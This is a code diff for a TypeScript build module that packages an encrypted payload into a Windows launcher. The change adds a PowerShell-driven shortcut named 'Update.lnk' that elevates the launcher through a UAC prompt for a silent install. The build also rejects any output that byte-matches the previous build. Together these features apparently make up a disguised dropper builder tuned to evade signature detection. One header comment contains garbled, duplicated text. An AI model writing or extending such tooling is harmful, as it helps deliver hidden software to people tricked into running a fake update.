@@ -1,26 +1,31 @@
 /**
- * launcher-build.ts — WP4 launcher-mode build path.
+ * launcher-build.ts — WP4 launcher-mode build path (PORTABLE Update.lnk).
  *
  * Mirrors generator/launcher/dev/make-stamp.mjs byte-for-byte: takes one warm
  * launcher from the pool, seals a fresh per-build envelope
  * (K_B ‖ IV_PAY ‖ IV_CFG ‖ CK) with the launcher's compile-time seal, re-keys
  * the cached payload and builds the URL-query config under K_B, appends
  * [hdr][env][cfg][pay][trailer] to the pooled exe, writes the sibling agent.bin,
- * and zips the PORTABLE pair { Launcher.exe, agent.bin } into the job dir, then
- * runs the WP6 validation report card (server-side checks). Nothing is
- * downloaded or fetched at build time; the payload plaintext lives only in
- * memory.
+ * and zips the PORTABLE carrier { Update.lnk, launcher/Launcher.exe,
+ * launcher/agent.bin } into the job dir, then runs the WP6 validation report
+ * card (server-side checks). Nothing is downloaded at build time; the payload
+ * plaintext lives only in memory.
  *
- * PORTABILITY (FIX 1, final): there is NO Update.lnk and NO baked path.
- * Launcher.exe is a requireAdministrator GUI PE that self-locates via its own
- * argv[0] and reads the sibling agent.bin from ITS O * argv[0] and reads the sibling agent.bin from ITS O  (Downloads/Desktop/...) and double-click Launcher.exe
- * -> UAC -> silent install. A relative .lnk does not resolve on this host
- * ("No application is associated") and an absolute .lnk bakes a user path
- * (fails for real users), so the exe-direct entry is the portable choice.
+ * PORTABILITY (FIX 1, final): the user double-clicks **Update.lnk**, which is a
+ * PowerShell-bridge shortcut that targets the OS PowerShell at a FIXED system
+ * path (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` — NO baked
+ * username/path) and runs `Start-Process -FilePath ".\launcher\Launcher.exe"
+ * -Verb RunAs`. Explorer starts the target in the Update.lnk's OWN folder (cwd),
+ * so the relative `.\(sub)\\Launcher.exe` always resolves from wherever the
+ * user extracted — dynamic, no hardcoded path. UAC comes from `-Verb RunAs`
+ * (and/or the launcher's requireAdministrator). The launcher reads its sibling
+ * agent.bin from ITS folder and installs silently.
  */
 
 import * as crypto from "crypto";
 import * as fs from "fs";
+import * as path from "path";
+import { spawn } from "child_process";
 import * as storage from "./storage";
 import * as payloadCache from "./payload-cache";
 import * as launcherPool from "./launcher-pool";
@@ -48,15 +53,20 @@ export interface LauncherBuildInputs {
 export interface LauncherRunOutput {
   zip: Buffer;
   stampedExe: Buffer;
+  lnk: Buffer;
   tag: string;
   launcherSha256: string;
+  lnkSha256: string;
   overlay: Buffer;
   configText: string;
 }
 
-// Per-build diversity tracking: a build whose stamped launcher byte-matches the
-// previous build's (astronomically unlikely) is rejected.
+const LNK_TIMEOUT_MS = 120000; // pwsh New-AgentShortcut.ps1 (bridge .lnk build)
+
+// Per-build diversity tracking: a build whose stamped launcher or Update.lnk
+// byte-matches the previous build's (astronomically unlikely) is rejected.
 let lastLauncherSha256: string | null = null;
+let lastLnkSha256: string | null = null;
 
 function sha256Hex(data: Buffer): string {
   return crypto.createHash("sha256").update(data).digest("hex");
@@ -76,6 +86,44 @@ export function buildConfigString(c: LauncherBuildInputs): string {
     `outDir=${enc(c.outDir)}`,
     `debug=${c.debug ? "1" : "0"}`,
   ].join("&");
+}
+
+interface PwshResult {
+  ok: boolean;
+  output: string;
+}
+
+function runPwsh(args: string[]): Promise<PwshResult> {
+  return new Promise((resolve) => {
+    try {
+      let stdout = "";
+      let stderr = "";
+      const proc = spawn("pwsh", ["-NoProfile", "-NoLogo", "-File", ...args], {
+        timeout: LNK_TIMEOUT_MS,
+      });
+      proc.stdout?.on("data", (d: Buffer) => (stdout += d.toString()));
+      proc.stderr?.on("data", (d: Buffer) => (stderr += d.toString()));
+      proc.on("error", (err: Error) =>
+        resolve({ ok: false, output: err.message })
+      );
+      proc.on("close", (code: number | null) => {
+        if (code === 0) resolve({ ok: true, output: stdout });
+        else if (code === null)
+          resolve({
+            ok: false,
+            output: `Update.lnk bridge build timed out after ${LNK_TIMEOUT_MS / 1000}s`,
+          });
+        else {
+          const tail =
+            stderr.length > 500 ? stderr.slice(-500) : stderr || stdout;
+          resolve({ ok: false, output: tail });
+        }
+      });
+    } catch (err) {
+      const message = err instanceof Error ? err.message : String(err);
+      resolve({ ok: false, output: message });
+    }
+  });
 }
 
 /**
@@ -139,22 +187,49 @@ export async function runLauncherBuild(opts: {
       "stamped launcher is not a GUI-subsystem PE — build aborted"
     );
   }
+
   const launcherPath = storage.launcherOutputPath(jobId);
   const agentBinPath = storage.agentBinOutputPath(jobId);
+  const lnkPath = storage.lnkRelativeOutputPath(jobId);
   fs.writeFileSync(launcherPath, stampedExe);
   fs.writeFileSync(agentBinPath, agentBin);
 
-  // 5. zip { Launcher.exe, agent.bin } — PORTABLE (no .lnk, no baked path).
+  // 5. Portable PowerShell-bridge Update.lnk: fixed system powershell target,
+  //    runs Start-Process .\launcher\Launcher.exe -Verb RunAs from the .lnk's
+  //    own folder (cwd) -> UAC -> launcher reads agent.bin -> silent install.
+  const bridgeResult = await runPwsh([
+    path.join(__dirname, "New-AgentShortcut.ps1"),
+    "-PowershellBridge",
+    "-Output",
+    lnkPath,
+    "-LauncherSubFolder",
+    "launcher",
+    "-LauncherTag",
+    entry.tag,
+  ]);
+  if (!bridgeResult.ok) {
+    throw new Error(`Powershell-bridge Update.lnk build failed: ${bridgeResult.output}`);
+  }
+  if (!fs.existsSync(lnkPath)) {
+    throw new Error("Update.lnk was not produced");
+  }
+  const lnk = fs.readFileSync(lnkPath);
+
+  // 6. zip { Update.lnk, launcher/Launcher.exe, launcher/agent.bin } (temp
+  //    files stay until validation). launcher/* subfolder == FIX 2 structure.
   const zip = createZip([
-    { name: "Launcher.exe", data: stampedExe },
-    { name: "agent.bin", data: agentBin },
+    { name: "Update.lnk", data: lnk },
+    { name: "launcher/Launcher.exe", data: stampedExe },
+    { name: "launcher/agent.bin", data: agentBin },
   ]);
   const zipPath = storage.zipOutputPath(jobId);
   fs.writeFileSync(zipPath, zip);
 
-  // 6. WP6 validation report card (server-side checks).
+  // 7. WP6 validation report card (server-side checks).
   const lzHash = sha256Hex(stampedExe);
+  const lnkHash = sha256Hex(lnk);
   const validation = await validateLauncherBuild({
+    lnkPath,
     launcherPath,
     zipPath,
     authToken: inputs.authToken,
@@ -163,14 +238,16 @@ export async function runLauncherBuild(opts: {
     sealIv,
     agentBin,
     prevLauncherHash: lastLauncherSha256,
+    prevLnkHash: lastLnkSha256,
   });
   for (const row of validation.rows) console.log(`  [validate] ${row}`);
   if (!validation.ok) {
     throw new Error("Launcher build failed validation — job aborted");
   }
-  // Task D: the zip is kept until expiry; drop the temp Launcher.exe + agent.bin.
+  // Task D: the zip is kept until expiry; drop the temp Update.lnk + launcher files.
   storage.removeLauncherTemp(jobId);
   lastLauncherSha256 = lzHash;
+  lastLnkSha256 = lnkHash;
 
   console.log(
     `Launcher build ok for job ${jobId}; launcher=${stampedExe.length}B ` +
@@ -181,8 +258,10 @@ export async function runLauncherBuild(opts: {
   return {
     zip,
     stampedExe,
+    lnk,
     tag: entry.tag,
     launcherSha256: lzHash,
+    lnkSha256: lnkHash,
     overlay,
     configText,
   };
